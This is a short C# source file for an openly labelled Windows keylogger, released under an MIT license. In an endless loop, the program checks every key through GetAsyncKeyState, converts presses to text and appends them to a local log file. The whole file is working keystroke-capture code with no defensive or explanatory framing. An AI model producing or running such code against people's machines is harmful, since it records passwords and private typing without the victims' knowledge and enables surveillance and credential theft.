/* KeyLogger
 * Copyright (C) 2019  henkje (henkje@pm.me)
 * 
 * MIT license
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        //Delay, used when no key is pressed
        const short Delay = 50;

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private static string _Key = string.Empty;

        static void Main()
        {
            int Keys = Enum.GetValues(typeof(Keys)).Length;

            while (true)
            {
                for (int i = 0; i < Keys; i++)//Loop every key.
                    if (GetAsyncKeyState(i) == -32767)//Check if key is pressed.
                        _Key += Enum.GetName(typeof(Keys), i);//Add key as string to _Keys.

                //If no key is pressed, wait x milliseconds.
                if (_Key.Length <= 0) { Task.Delay(Delay).Wait(); continue; }

                //Key is pressed, continue.
                //Ingenore LButton and RButton, these are mouse clicks.
                if (_Key.Equals("LButton")) { _Key = string.Empty; continue; }
                if (_Key.Equals("RButton")) { _Key = string.Empty; continue; }

                _Key = _Key.Replace("Enter", Environment.NewLine);//Replace Enter for a new line.
                _Key = _Key.Replace("Space", " ");//Replace Space for a real space.

                File.AppendAllText("log.text", _Key);//Write key to file.
                _Key = string.Empty;//clear key.
            }
        }
    }
}
